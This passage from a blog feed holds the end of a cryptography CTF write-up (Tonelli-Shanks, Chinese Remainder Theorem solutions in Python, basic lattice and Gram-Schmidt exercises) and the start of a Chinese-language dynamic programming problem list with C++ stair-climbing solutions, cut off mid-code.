8479994658316772151941616510097127087554541274812435112009425778595495359700244470400642403747058566807127814165396640215844192327900454116257979487432016769329970767046735091249898678088061634796559556704959846424131820416048436501387617211770124292793308079214153179977624440438616958575058361193975686620046439877308339989295604537867493683872778843921771307305602776398786978353866231661453376056771972069776398999013769588936194859344941268223184197231368887060609212875507518936172060702209557124430477137421847130682601666968691651447236917018634902407704797328509461854842432015009878011354022108661461024768p = 30531851861994333252675935111487950694414332763909083514133769861350960895076504687261369815735742549428789138300843082086550059082835141454526618160634109969195486322015775943030060449557090064811940139431735209185996454739163555910726493597222646855506445602953689527405362207926990442391705014604777038685880527537489845359101552442292804398472642356609304810680731556542002301547846635101455995732584071355903010856718680732337369128498655255277003643669031694516851390505923416710601212618443109844041514942401969629158975457079026906304328749039997262960301209158175920051890620947063936347307238412281568760161print(Tonelli_Shanks(a,p))</code></pre><p>Ans</p><pre class=" language-bash"><code class="language-bash">2362339307683048638327773298580489298932137505520500388338271052053734747862351779647314176817953359071871560041125289919247146074907151612762640868199621186559522068338032600991311882224016021222672243139362180461232646732465848840425458257930887856583379600967761738596782877851318489355679822813155123045705285112099448146426755110160002515592418850432103641815811071548456284263507805589445073657565381850521367969675699760755310784623577076440037747681760302434924932113640061738777601194622244192758024180853916244427254065441962557282572849162772740798989647948645207349737457445440405057156897508368531939120</code></pre><h3 id="Chinese-Remainder-Theorem"><a href="#Chinese-Remainder-Theorem" class="headerlink" title="Chinese Remainder Theorem"></a>Chinese Remainder Theorem</h3><blockquote><p>The Chinese Remainder Theorem gives a unique solution to a set of linear congruences if their moduli are coprime.<br>This means, that given a set of arbitrary integers ai, and pairwise coprime integers ni, such that the following linear congruences hold:</p></blockquote><pre class=" language-bash"><code class="language-bash">x ≡ a1 mod n1x ≡ a2 mod n2<span class="token punctuation">..</span>.x ≡ an mod nn</code></pre><p>There is a unique solution <code>x ≡ a mod N</code> where <code>N = n1 * n2 * ... * nn</code>.</p><div class="spoiler collapsed">    <div class="spoiler-title">        problem    </div>    <div class="spoiler-content">        <p>Given the following set of linear congruences:</p><pre class=" language-bash"><code class="language-bash">x ≡ 2 mod 5x ≡ 3 mod 11x ≡ 5 mod 17</code></pre><p>Find the integer a such that x ≡ a mod 935</p>    </div></div><h4 id="Sol1"><a href="#Sol1" class="headerlink" title="Sol1"></a>Sol1</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token punctuation">,</span> libnum<span class="token keyword">from</span> functools <span class="token keyword">import</span> reduce<span class="token keyword">def</span> <span class="token function">CRT</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> mod<span class="token punctuation">)</span><span class="token punctuation">:</span>    M <span class="token operator">=</span> reduce<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>x<span class="token operator">*</span>y<span class="token punctuation">,</span> mod<span class="token punctuation">)</span>    ans <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        m <span class="token operator">=</span> M <span class="token operator">//</span> mod<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        ans <span class="token operator">+=</span> r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> m <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>m<span class="token punctuation">,</span> mod<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> ans <span class="token operator">%</span> Ma <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>n <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>CRT<span class="token punctuation">(</span>a<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="Sol2"><a href="#Sol2" class="headerlink" title="Sol2"></a>Sol2</h4><p>We can directly use <code>crt()</code> in sympy</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> sympy<span class="token punctuation">.</span>ntheory<span class="token punctuation">.</span>modular <span class="token keyword">import</span> crta <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>n <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>crt<span class="token punctuation">(</span>n<span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>Ans <code>872</code></p><hr><h2 id="Lattices"><a href="#Lattices" class="headerlink" title="Lattices"></a>Lattices</h2><h3 id="Vectors"><a href="#Vectors" class="headerlink" title="Vectors"></a>Vectors</h3><blockquote><p>Given a three dimensional vector space defined over the reals, where <code>v = (2,6,3)</code>, <code>w = (1,0,0)</code> and <code>u = (7,7,2)</code>, calculate <code>3*(2*v - w) ∙ 2*u</code>.</p></blockquote><p>basic vector arithmetic.<br><code>3*(2*v - w) ∙ 2*u = (9,36,18) ∙ (14,14,4) = 45*14 + 18*4 = 702</code></p><h3 id="Size-and-Basis"><a href="#Size-and-Basis" class="headerlink" title="Size and Basis"></a>Size and Basis</h3><blockquote><p>Given the vector v = (4, 6, 2, 5), calculate its size.</p></blockquote><p>basic vector arithmetic.<br><code>(4^2 + 6^2 + 2^2 + 5^2)^(1/2) = 9</code></p><h3 id="Gram-Schmidt"><a href="#Gram-Schmidt" class="headerlink" title="Gram Schmidt"></a>Gram Schmidt</h3><blockquote><p>Algorithm for Gram-Schmidt<br>u1 = v1<br>Loop i = 2,3…,n<br>   Compute μij = vi ∙ uj / ||uj||2, 1 ≤ j &lt; i.<br>   Set ui = vi - μij * uj (Sum over j for 1 ≤ j &lt; i)<br>End Loop</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        problem    </div>    <div class="spoiler-content">        <p>Given the following basis vectors:</p><p>v1 = (4,1,3,-1), v2 = (2,1,-3,4), v3 = (1,0,-2,7), v4 = (6, 2, 9, -5),</p><p>use the Gram-Schmidt algorithm to calculate an orthogonal basis. The flag is the float value of the second component of u4 to 5 significant figures.</p>    </div></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write-up </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DP(Dynamic Programming) 題單</title>
      <link href="/2022/04/19/DP-Dynamic-Programming/"/>
      <url>/2022/04/19/DP-Dynamic-Programming/</url>
      
        <content type="html"><![CDATA[<h2 id="SCIST"><a href="#SCIST" class="headerlink" title="SCIST"></a>SCIST</h2><h3 id="基本：基礎"><a href="#基本：基礎" class="headerlink" title="基本：基礎"></a>基本：基礎</h3><h4 id="No-judge-爬樓梯問題"><a href="#No-judge-爬樓梯問題" class="headerlink" title="No judge - 爬樓梯問題"></a>No judge - 爬樓梯問題</h4><blockquote><p>有一個 N 階的樓梯，你站在第 0 階上，每一步只能爬 1 階或 2 階，且只能向上爬，不能往下走，求有多少種不同方法可以抵達第 N 階。</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        top down    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">10005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">bool</span> used<span class="token punctuation">[</span><span class="token number">10005</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>used<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    used<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">dfs</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">dfs</span><span class="token punctuation">(</span>n<span class="token number">-2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    used<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>used<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token function">dfs</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><div class="spoiler collapsed">    <div class="spoiler-title">        bottom up    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">10005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">2</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>i<span class="token number">-2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><h4 id="No-judge-爬樓梯問題．改"><a href="#No-judge-爬樓梯問題．改" class="headerlink" title="No judge - 爬樓梯問題．改"></a>No judge - 爬樓梯問題．改</h4><blockquote><p>有一個 N 階的樓梯，你站在第 0 階上，每一步只能爬 1 階或 2 階，且只能向上爬，不能往下走，抵達第 i 階時要付 Ci 的過路費，求最佳策略下，抵達第 N 階上的最小過路費總和。</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        top down    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">10005</span><span class="token punctuation">]</span><span class="token punctuation">,</span>c<span class="token punctuation">[</span><span class="token number">10005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">bool</span> used<span class="token punctuation">[</span><span class="token number">10005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>used<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    used<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">dfs</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">dfs</span><span class="token punctuation">(</span>n<span class="token number">-2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>c<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">>></span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    used<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>used<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token function">dfs</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"\n"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre>    </div></div><div class="spoiler collapsed">    <div class="spoiler-title">        bottom up    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">10005</span><span class="token punctuation">]</span><span class="token punctuation">,</span>c<span class="token punctuation">[</span><span class="token number">10005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">>></span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">2</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span> <span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token number">-2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><h4 id="No-judge-極．爬樓梯問題"><a href="#No-judge-極．爬樓梯問題" class="headerlink" title="No judge - 極．爬樓梯問題"></a>No judge - 極．爬樓梯問題</h4><blockquote><p>有一個 N 階的樓梯，你站在第 0 階上，每一步只能爬 1、2 或 3 階，嚴禁連續兩步都爬同樣多階，且只能向上爬，不能往下走，求有多少種不同方法可以抵達第 N 階。</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        bottom up    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">10005</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">3</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token number">-2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>i<span class="token number">-2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token number">-3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>i<span class="token number">-3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>dp<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>    </div></div><h4 id="No-judge-爬樓梯問題．改二"><a href="#No-judge-爬樓梯問題．改二" class="headerlink" title="No judge - 爬樓梯問題．改二"></a>No judge - 爬樓梯問題．改二</h4><blockquote><p>有一個 N 階的樓梯，你站在第 0 階上，每一步只能爬 1 階或 2 階，且只能向上爬，不能往下走，抵達第 i 階時要付 Ci 的過路費，但是你兄弟會幫你出掉大部份的過路費，你只要付最終過路費的個數即可。求最佳策略下，抵達第 N 階所需付的最小金額（兄弟幫付的不計）。</p></blockquote><div class="spoiler collapsed">    <div class="spoiler-title">        bottom up    </div>    <div class="spoiler-content">        <pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> c<span class="token punctuation">[</span><span class="token number">10005</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">bool</span> dp<span class="token punctuation">[</span><span class="token number">10005</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        cin<span class="token operator">>></span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">%</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">9</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>c<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">3</span> <span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span> <span class="token punctuation">;</span> j<span class="token operator">&lt;=</span><span class="token number">9</span> <span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">10</span><span class="token operator">-</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">||</span> dp<span class="token punctuation">[</span>i<span class="token number">-2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">10</span><span class="token operator">-</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span> <span class="token punctuation">;</span> i<span class="token 